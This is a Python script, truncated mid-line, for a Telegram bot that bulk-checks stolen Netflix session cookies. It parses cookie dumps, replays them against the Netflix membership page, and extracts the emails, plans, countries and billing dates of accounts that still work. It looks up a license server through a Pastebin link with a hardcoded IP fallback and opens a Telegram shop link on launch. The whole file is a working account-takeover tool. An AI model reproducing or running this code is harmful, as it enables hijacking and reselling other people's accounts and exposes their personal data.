import requests
import re
import time
import os
import tempfile
import zipfile
import shutil
import random
import json
import threading
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
import telebot
import webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# ====================== SERVER DISCOVERY & API KEY (from original combo script) ======================
PASTEBIN_URL = "https://pastebin.com/raw/0sV8DdMg"
CONFIG_FILE = "api_config_NF.json"
_server_base_url_cache = None

def test_server_url(base_url):
    if not base_url: return False
    try:
        resp = requests.get(f"{base_url}/api/validate/DUMMY_KEY_FOR_TEST", timeout=5)
        return resp.status_code in (200, 401)
    except:
        return False

def get_server_base_url():
    global _server_base_url_cache
    if _server_base_url_cache: return _server_base_url_cache
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                saved = json.load(f).get('server_url')
                if saved and test_server_url(saved):
                    _server_base_url_cache = saved
                    return saved
        except:
            pass
    for _ in range(3):
        try:
            resp = requests.get(PASTEBIN_URL, timeout=10)
            if resp.status_code == 200:
                url = resp.text.strip()
                if url.startswith(('http://', 'https://')) and test_server_url(url):
                    with open(CONFIG_FILE, 'w') as f:
                        json.dump({'server_url': url}, f)
                    _server_base_url_cache = url
                    return url
        except:
            pass
        time.sleep(1)
    fallback = "http://20.118.168.57:5000"
    _server_base_url_cache = fallback
    return fallback

API_KEY = None

def validate_api_key(key):
    try:
        base_url = get_server_base_url()
        url = f"{base_url}/api/validate/netflix/{key}"
        r = requests.get(url, timeout=10)
        return r.status_code == 200 and r.json().get('valid', False)
    except:
        return False

# ====================== YOUR EXACT WORKING COOKIE CHECKER ======================
class NetflixBulkChecker:
    def __init__(self, threads=10):
        self.threads = threads
        self.lock = threading.Lock()
        self.stats = {'total': 0, 'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'start_time': time.time()}
        self.premium_accounts = []
        self.chat_id = None

    def parse_netscape_cookie(self, text):
        cookies = {}
        text = text.strip()
        if not text: return cookies
        if ';' in text and '=' in text:
            for part in text.split(';'):
                part = part.strip()
                if '=' in part:
                    k, v = part.split('=', 1)
                    cookies[k.strip()] = v.strip()
            if cookies: return cookies
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith('#'): continue
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5]] = parts[6]
                    continue
            parts = re.split(r'\s+', line)
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
                continue
            if '=' in line:
                k, v = line.split('=', 1)
                cookies[k.strip()] = v.strip()
        return cookies

    def check_cookie(self, cookie_text, source_name):
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies: return None
            session = requests.Session()
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.netflix.com', path='/')
            r = session.get('https://www.netflix.com/account/membership', timeout=40, allow_redirects=True)
            if 'login' in r.url.lower() or '"membershipStatus":"CURRENT_MEMBER"' not in r.text:
                return None
            html = r.text
            result = {
                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) or 'N/A',
                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) or 'Unknown',
                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) or 'XX',
                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"
